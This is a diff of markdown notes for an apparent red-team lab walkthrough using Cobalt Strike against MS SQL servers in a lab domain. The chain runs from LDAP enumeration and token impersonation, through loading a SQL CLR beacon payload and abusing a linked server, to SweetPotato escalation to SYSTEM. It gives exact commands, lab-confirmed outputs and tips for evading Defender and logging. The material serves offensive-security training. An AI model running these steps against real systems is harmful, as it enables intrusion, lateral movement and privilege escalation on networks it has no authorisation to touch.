@@ -8,6 +8,13 @@
 
 # Enumeration
 
+> ⚠️ **Beacon context key used throughout this lab:**
+> - `[BEACON: wkstn-1 | USER: pchilds]` — medium-integrity foothold beacon
+> - `[BEACON: wkstn-1 | USER: rsteel]` — same beacon after steal_token from rsteel's process
+> - `[BEACON: lon-db-1 | USER: mssql_svc]` — CLR beacon inside lon-db-1 sqlservr.exe
+> - `[BEACON: lon-db-2 | USER: mssql_svc]` — CLR beacon inside lon-db-2 sqlservr.exe
+> - `[BEACON: lon-db-2 | USER: SYSTEM]` — tcp-local beacon after SweetPotato privesc
+
 **Why this phase:** You need to identify what SQL servers exist, how they authenticate, and what privilege your current user has before attempting any exploitation. Going in blind wastes time and creates unnecessary noise.
 
 1. Launch Cobalt Strike and connect to the team server.
@@ -19,7 +26,7 @@
 
     > **Why:** SQL-BOF provides `sql-*` commands implemented as Beacon Object Files (BOFs). BOFs run directly inside the beacon thread — no child process is spawned. This makes all subsequent `sql-*` commands `OPSEC-SAFE`.
 
-3. Interact with the medium-integrity Beacon and search for MS SQL servers configured for Kerberos authentication.
+3. **[BEACON: wkstn-1 | USER: pchilds]** — Search for MS SQL servers configured for Kerberos authentication.
 
     ```
     ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
@@ -29,7 +36,7 @@
     > The SPN value (`MSSQLSvc/lon-db-1.contoso.com:1433`) is also what you will use later when requesting Kerberos service tickets — note it now.  
     > `OPSEC-SAFE` — LDAP query uses existing domain connection inside the beacon.
 
-4. Get information about the *lon-db-1* instance and your current privileges:
+4. **[BEACON: wkstn-1 | USER: pchilds]** — Get information about the *lon-db-1* instance and your current privileges:
 
     ```
     sql-info lon-db-1
@@ -41,11 +48,13 @@
 
     > **Expected output:** You are authenticated as `pchilds` but only have `public/guest` privileges — not sysadmin. You cannot run CLR or xp_cmdshell with guest privileges. This tells you impersonation is needed.
 
-5. Use domain enumeration to reveal principals that may have a sysadmin role on the SQL server. Search for SQL/DB/Database-named groups and their members.
+5. **[BEACON: wkstn-1 | USER: pchilds]** — Find groups that grant sysadmin on the SQL server.
 
     ```
     ldapsearch (&(samAccountType=268435456)(|(name=*SQL*)(name=*DB*)(name=*Database*))) --attributes distinguishedName,member
     ```
+
+    > Lab-confirmed: `CN=Database Admins` — member: `CN=Robert Steel` (rsteel).
 
     > **Why:** SQL sysadmin roles are often granted via AD security groups (e.g. a "SQL Admins" group whose members are granted sysadmin at the SQL level). By finding these groups and their membership, you identify which domain account you need to impersonate.  
     > `samAccountType=268435456` = security groups.  
@@ -53,7 +62,7 @@
 
     > **Expected output:** A group that contains `rsteel` (or similar user) as a member. This user has sysadmin on lon-db-1.
 
-6. Impersonate the *rsteel* user to gain sysadmin access on lon-db-1.
+6. **[BEACON: wkstn-1 | USER: pchilds → rsteel]** — Impersonate the *rsteel* user to gain sysadmin access on lon-db-1.
 
     > **Why:** rsteel has the sysadmin role on lon-db-1 — you need to authenticate to SQL as rsteel. SQL Server uses Windows authentication (Kerberos), so presenting rsteel's Kerberos ticket or access token will make the SQL server treat you as rsteel with full sysadmin.
 
@@ -117,7 +126,7 @@
     > `run klist` confirms the ticket is loaded. You should see `MSSQLSvc/lon-db-1.contoso.com:1433` in the list.  
     > `OPSEC-CAUTION` — Event ID 4648 logged for the `make_token` operation.
 
-7. Query your privileges on the SQL instance again and verify they have changed to sysadmin.
+7. **[BEACON: wkstn-1 | USER: rsteel]** — Verify sysadmin is confirmed on lon-db-1.
 
     ```
     sql-whoami lon-db-1
@@ -131,7 +140,7 @@
 
 **Why this phase:** With sysadmin on lon-db-1, you want to run OS-level code inside the SQL process. SQL CLR loads a .NET assembly into `sqlservr.exe` memory — code executes inside the SQL process with no child process spawned. This is far stealthier than `xp_cmdshell`, which spawns `cmd.exe` as a direct child and is heavily signatured.
 
-1. Check the status of SQL CLR.
+1. **[BEACON: wkstn-1 | USER: rsteel]** — Check the status of SQL CLR.
 
     ```
     sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"
@@ -141,7 +150,7 @@
     > `OPSEC-CAUTION` — querying `sys.configurations` is logged if SQL auditing is active.  
     > **Expected output:** `0` = disabled.
 
-2. Enable SQL CLR on *lon-db-1*.
+2. **[BEACON: wkstn-1 | USER: rsteel]** — Enable SQL CLR on *lon-db-1*.
 
     ```
     sql-enableclr lon-db-1
@@ -318,7 +327,7 @@
     Build the project: **Build → Build Solution** (ensure Release mode is selected, not Debug)  
     Output: `C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll`
 
-7. Load the CLR assembly on *lon-db-1* and execute the stored procedure.
+7. **[BEACON: wkstn-1 | USER: rsteel]** — Load the CLR assembly on *lon-db-1* and execute the stored procedure.
 
     ```
     sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
@@ -328,7 +337,7 @@
     > `OPSEC-CAUTION` — `TRUSTWORTHY` database setting change is logged. The CLR assembly registration is visible in `sys.assemblies`. The stored procedure execution is logged if SQL auditing is active.  
     > The beacon will now be running inside `sqlservr.exe` on lon-db-1 as the SQL service account.
 
-8. Link to the Beacon on lon-db-1.
+8. **[BEACON: wkstn-1 | USER: pchilds OR rsteel]** — Link to the Beacon on lon-db-1.
 
     > **Why linking is needed:** The SMB beacon is not a reverse HTTP/HTTPS beacon — it does not call out to your team server. Instead, it creates an SMB named pipe and waits. You must connect *to it* from a beacon that has SMB access to lon-db-1. Linking creates the communication tunnel: `CS Team Server → your beacon → SMB pipe → SQL beacon`.
 
@@ -374,7 +383,7 @@
     > Delete the .kirbi file after linking: `rm C:\Users\Attacker\Desktop\cifs.kirbi`  
     > `OPSEC-CAUTION` — .kirbi file written to disk temporarily.
 
-9. Disable SQL CLR on *lon-db-1* after the beacon is linked.
+9. **[BEACON: wkstn-1 | USER: rsteel]** — Disable SQL CLR on *lon-db-1* after the beacon is linked.
 
     ```
     sql-disableclr lon-db-1
@@ -387,72 +396,101 @@
 
 # Lateral Movement
 
-**Why this phase:** lon-db-1 has a SQL linked server relationship with lon-db-2. The link runs with credentials that have sysadmin on lon-db-2. You can use this to execute your CLR payload on lon-db-2 without your attacker machine having direct network access to lon-db-2 — the query tunnels through lon-db-1's SQL link.
+**Why this phase:** lon-db-1 has a SQL linked server relationship with lon-db-2. The link uses passthrough Windows auth — the SQL identity used on lon-db-2 depends on WHO connects to lon-db-1's SQL. You must connect as a user that has sysadmin on BOTH servers (rsteel/Database Admins). The `mssql_svc` service account has sysadmin on lon-db-1 but only guest/public on lon-db-2 — running these commands from the lon-db-1 CLR beacon will fail.
 
-1. Enumerate SQL links on *lon-db-1*.
+> ⚠️ **BEACON CONTEXT IS CRITICAL for this phase.** Each command below is labelled:
+> - `[BEACON: wkstn-1 | USER: rsteel]` — run from your original foothold beacon impersonating rsteel
+> - `[BEACON: lon-db-1 | USER: mssql_svc]` — run from the CLR beacon inside lon-db-1's sqlservr.exe
+> - `[BEACON: lon-db-2 | USER: mssql_svc]` — run from the CLR beacon inside lon-db-2's sqlservr.exe
 
-    ```
+---
+
+1. **[BEACON: wkstn-1 | USER: rsteel]** — Confirm rsteel is still impersonated, then enumerate SQL links on *lon-db-1*.
+
+    ```cs
+    getuid    // must show CONTOSO\rsteel — re-run steal_token <rsteel-pid> if not
     sql-links lon-db-1
     ```
 
-    > **Why:** Reveals all linked server relationships configured on lon-db-1. Each link has a name, remote server address, and the credentials used by the link.
+    > OPSEC-🟢SAFE — SQL-BOF, no child process. Expected: `LON-DB-2 | SQL Server | SQLNCLI | LON-DB-2`.
 
-2. Verify your privileges on *lon-db-2* via *lon-db-1*.
+2. **[BEACON: wkstn-1 | USER: rsteel]** — Verify rsteel has sysadmin on *lon-db-2* via the link.
 
-    ```
+    ```cs
     sql-whoami lon-db-1 "" lon-db-2
     ```
 
-    > **Why:** Before attempting exploitation, confirm you have sysadmin on lon-db-2 via the link. The `""` second argument = no intermediate hop (direct link from lon-db-1 to lon-db-2).  
-    > **Expected output:** sysadmin role on lon-db-2 — the link is configured with elevated credentials.
+    > ⚠️ Lab-confirmed (2026-04-19): Running this from the **lon-db-1 mssql_svc beacon** shows only `guest/public` on lon-db-2 — mssql_svc is not sysadmin on lon-db-2. Running it from the **wkstn-1 rsteel beacon** shows `sysadmin` — the link passes rsteel's identity through because rsteel is in the Database Admins group on both DB servers.
+    >
+    > Expected output (as rsteel): `sysadmin role` on lon-db-2.
 
-3. Check the status of RPC Out on the link.
+3. **[BEACON: wkstn-1 | USER: rsteel]** — Check RPC Out status on the link.
 
-    ```
+    ```cs
     sql-checkrpc lon-db-1
     ```
 
-    > **Why:** `EXECUTE AT linked_server` (which is how SQL-BOF runs CLR remotely) requires RPC Out to be enabled on the link. If disabled, you can query data through the link but cannot execute stored procedures (including CLR). Check before enabling so you know you're making a change.
+    > Expected: `LON-DB-2 | is_rpc_out_enabled: 0` — must enable before CLR relay works.
 
-4. Enable RPC Out on the link to *lon-db-2*.
+4. **[BEACON: wkstn-1 | USER: rsteel]** — Enable RPC Out on the link to *lon-db-2*.
 
-    ```
+    ```cs
     sql-enablerpc lon-db-1 lon-db-2
     ```
 
-    > `OPSEC-CAUTION` — modifying link configuration is logged in SQL Server error log and visible in `sys.servers`. This is a detectable change.
+    > OPSEC-🟠CAUTION — link config change logged in SQL Server error log and `sys.servers`.
 
-5. Execute the SQL CLR payload on *lon-db-2* via *lon-db-1*.
+5. **[BEACON: wkstn-1 | USER: rsteel]** — Execute the SQL CLR payload on *lon-db-2* via *lon-db-1*.
 
-    ```
+    ```cs
     sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
     ```
 
-    > **What happens:** SQL-BOF sends the CLR payload to lon-db-1, which then relays it to lon-db-2 via the SQL link using `EXECUTE AT [lon-db-2]`. The assembly is loaded and executed on lon-db-2.  
-    > The beacon spawns inside `sqlservr.exe` on lon-db-2 as that server's MSSQL service account.  
-    > The fourth argument `""` = no intermediate hop; fifth `lon-db-2` = target.
+    > ⚠️ **Must run from wkstn-1 as rsteel — NOT from the lon-db-1 beacon.** The SQL-BOF connects to lon-db-1 using the beacon's Windows identity. From the lon-db-1 mssql_svc beacon, the connection authenticates as mssql_svc (guest on lon-db-2) → `42000: The user does not have permission`. From the wkstn-1 rsteel beacon, the connection authenticates as rsteel (sysadmin on both) → success.
+    >
+    > Lab-confirmed (2026-04-19) success output:
+    > ```
+    > [*] CLR is enabled
+    > [*] RPC out is enabled
+    > [*] Assembly hash does not exist (error fetching result normal)
+    > [*] Added SHA-512 hash for DLL to sys.trusted_assemblies with the name "kfcnflhv"
+    > [*] Creating a new custom assembly with the name "sjhnfhrr"
+    > [*] Loading DLL into stored procedure "MyProcedure"
+    > [*] Created "[sjhnfhrr].[StoredProcedures].[MyProcedure]"
+    > [*] Executing payload...
+    > [*] Cleaning up...
+    > ```
+    > Wait ~10 seconds for beacon to spawn inside lon-db-2's sqlservr.exe before linking.
+    >
+    > OPSEC-🟠CAUTION — TRUSTWORTHY setting change and assembly registration logged on lon-db-2.
 
-6. Link to the Beacon on *lon-db-2* — run this command from the **lon-db-1 beacon**.
+6. **[BEACON: lon-db-1 | USER: mssql_svc]** — Link to the beacon on *lon-db-2*.
 
-    Interact with the lon-db-1 beacon in CS, then:
+    Switch to the **lon-db-1 CLR beacon**, then:
 
+    ```cs
+    link lon-db-2 <smb-listener-pipe-name>
     ```
-    link lon-db-2 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
-    ```
 
-    > **Critical — why run from lon-db-1's beacon, not your attacker machine:**  
-    > lon-db-2 is on a separate network segment. Firewall rules likely block direct SMB (TCP 445) from your attacker machine to lon-db-2. lon-db-1 is network-adjacent to lon-db-2 (the SQL link already proves connectivity on port 1433, and the server accounts have CIFS access to each other).  
-    > By linking from lon-db-1's beacon, you build a chain: `CS Team Server ↔ Attacker beacon ↔ lon-db-1 SMB beacon ↔ lon-db-2 SMB beacon`.  
-    > The lon-db-1 beacon runs as the MSSQL service account, which already has the necessary Kerberos credentials to authenticate to lon-db-2 via SMB.  
-    > `OPSEC-SAFE` — SMB named pipe connection, no new process spawned.
+    > ⚠️ Must run from **lon-db-1 beacon** — lon-db-2 is on a separate network segment not reachable from wkstn-1 via SMB. lon-db-1 has direct network adjacency to lon-db-2 (SQL link already proved TCP 1433 connectivity; mssql_svc has CIFS access to lon-db-2).
+    >
+    > This builds the chain: `CS Team Server ↔ wkstn-1 beacon ↔ lon-db-1 SMB beacon ↔ lon-db-2 SMB beacon`.
+    >
+    > Lab-confirmed (2026-04-19): `[+] established link to child beacon: 10.10.120.25`
+    >
+    > OPSEC-🟢SAFE — SMB named pipe connection, no new process spawned.
 
-7. Disable RPC on the link after the beacon is linked.
+7. **[BEACON: wkstn-1 | USER: rsteel]** — Disable RPC Out after beacon is linked.
 
-    ```
+    ```cs
     sql-disablerpc lon-db-1 lon-db-2
     ```
 
-    > **Why:** Clean up. Revert RPC Out to reduce your configuration footprint.
+    > Clean up — revert RPC Out to reduce configuration footprint.
+
+---
+
+> ⚠️ **Failure trap (lab-confirmed 2026-04-19):** If `sql-clr ... "" lon-db-2` is run from the **lon-db-1 mssql_svc beacon**, it fails with `42000: The user does not have permission to perform this action`. This leaves a dirty hash in `sys.trusted_assemblies` on lon-db-2. On the next clean attempt (from rsteel context), SQL-BOF detects and drops the leftover hash automatically — allow it to proceed.
 
 ---
 
@@ -460,13 +498,15 @@
 
 **Why this phase:** The beacon running inside `sqlservr.exe` on lon-db-2 is running as the MSSQL service account (`NT Service\MSSQLSERVER`). This account has `SeImpersonatePrivilege` enabled by design — SQL Server requires it to impersonate client connections. SweetPotato exploits this privilege to get a SYSTEM token and run an arbitrary process as SYSTEM.
 
-1. Interact with the new Beacon running on *lon-db-2*.
+1. Interact with the **lon-db-2 CLR beacon** in CS.
 
-2. Check the service account identity and token privileges.
+2. **[BEACON: lon-db-2 | USER: mssql_svc]** — Check the service account identity.
 
     ```
-    whoami
+    getuid
     ```
+
+    > Lab-confirmed: `CONTOSO\mssql_svc`. SweetPotato requires `SeImpersonatePrivilege` — present by design on all SQL service accounts.
 
     > **Expected output:** `NT Service\MSSQLSERVER` (or similar SQL service account).  
     > The BOF output will include `SeImpersonatePrivilege: Enabled`.  
@@ -485,7 +525,7 @@
     > **Why tcp-local:** lon-db-2 is on a separate network segment with no outbound path to your team server. `tcp-local` binds only to `127.0.0.1` — the beacon is reached via the existing beacon chain (lon-db-1's beacon connects to it locally on lon-db-2), not directly from your attacker machine.  
     > **Why Process exit:** After SweetPotato runs the EXE and the beacon connects back, the EXE can exit. The beacon communicates through the chain, not via this process.
 
-4. Change Beacon's working directory to a writable location less likely to trigger AV.
+4. **[BEACON: lon-db-2 | USER: mssql_svc]** — Change working directory to MSSQL service profile (mssql_svc owns it, less monitored than Temp).
 
     ```
     cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps
@@ -494,7 +534,7 @@
     > **Why this directory:** The MSSQL service account has write access to its own service profile directory. `WindowsApps` within it is less aggressively monitored by Defender compared to `C:\Windows\Temp` or `C:\Users\Public`. The MSSQL service account owns this path so no permission errors.  
     > **Exam note:** In the exam, ensure your EXE is built with a custom artifact kit to avoid Defender static signatures on the binary.
 
-5. Upload the tcp-local payload.
+5. **[BEACON: lon-db-2 | USER: mssql_svc]** — Upload the tcp-local payload.
 
     ```
     upload C:\Payloads\tcp-local_x64.exe
@@ -502,11 +542,20 @@
 
     > `OPSEC-CAUTION` — file write to disk. Defender may flag the EXE. Custom artifact required in exam.
 
-6. Execute the payload using SweetPotato to abuse SeImpersonatePrivilege.
+6. **[BEACON: lon-db-2 | USER: mssql_svc]** — Execute the payload using SweetPotato to abuse SeImpersonatePrivilege.
 
     ```
     execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
     ```
+
+    > Lab-confirmed (2026-04-19): SweetPotato used **PrintSpoofer** method (`-i` NP impersonation):
+    > ```
+    > [+] Triggering notification on evil PIPE \\lon-db-2/pipe/...
+    > [+] Server connected to our evil RPC pipe
+    > [+] Duplicated impersonation token ready for process creation
+    > [+] Intercepted and authenticated successfully, launching program
+    > [+] Process created, enjoy!
+    > ```
 
     > **What SweetPotato does:**
     > 1. Creates a fake COM server on the local machine
@@ -517,17 +566,34 @@
     > Result: `tcp-local_x64.exe` runs as `NT AUTHORITY\SYSTEM`.  
     > `OPSEC-CAUTION` — `execute-assembly` uses fork & run (spawns a sacrificial process). For the exam, ensure your malleable profile has `spawnto` set to a non-signatured binary (e.g. `dllhost.exe`).
 
-7. Connect to the new SYSTEM beacon.
+7. **[BEACON: lon-db-2 | USER: mssql_svc]** — Connect to the new SYSTEM beacon.
 
     ```
     connect localhost 1337
     ```
+
+    > Lab-confirmed: `[+] established link to child beacon: 10.10.120.25` → `NT AUTHORITY\SYSTEM` on lon-db-2.
 
     > **Why localhost:** The tcp-local beacon bound to `127.0.0.1:1337` on lon-db-2. Since you are already running a beacon on lon-db-2 (the MSSQL one), `connect localhost 1337` reaches the SYSTEM beacon from within the same host.  
     > `OPSEC-SAFE` — loopback TCP connection, no external traffic.  
     > Port `1337` is defined in your `tcp-local` listener configuration.
 
 ---
+
+===
+
+## Lab Observations (2026-04-19)
+
+| Finding | Detail |
+|---------|--------|
+| **CRITICAL: sql-clr beacon context** | `sql-clr ... "" lon-db-2` MUST run from **wkstn-1 as rsteel**. Running from lon-db-1 mssql_svc beacon → `42000: no permission` because mssql_svc is only guest/public on lon-db-2 |
+| `sql-whoami` context-dependent | From lon-db-1 beacon (mssql_svc): guest/public on lon-db-2. From wkstn-1 beacon (rsteel): sysadmin on lon-db-2. Same command, different result — identity passed through SQL link |
+| link must run from lon-db-1 beacon | `link lon-db-2 <pipe>` must run from the **lon-db-1 CLR beacon** — lon-db-2 is not reachable from wkstn-1 over SMB |
+| Dirty hash cleanup | Failed sql-clr attempts leave hash in `sys.trusted_assemblies` on lon-db-2. SQL-BOF auto-detects and drops on next attempt — let it proceed |
+| SweetPotato method | PrintSpoofer (`-i` NP impersonation) — not DCOM/BITS. Triggers on `\\lon-db-2/pipe/...` |
+| mssql_svc service account | Runs lon-db-1 SQL (`CONTOSO\mssql_svc`), has SeImpersonatePrivilege on lon-db-2, but only guest on lon-db-2 SQL |
+| Database Admins group | Members: rsteel. Has sysadmin on both lon-db-1 and lon-db-2 SQL |
+| Beacon chain | `wkstn-1 (pchilds) ↔ lon-db-1 (mssql_svc, SMB) ↔ lon-db-2 (mssql_svc, SMB) ↔ lon-db-2 (SYSTEM, tcp-local)` |
 
 <img src="/images/sql-servers-lab-graph-view.png" width=860>
 
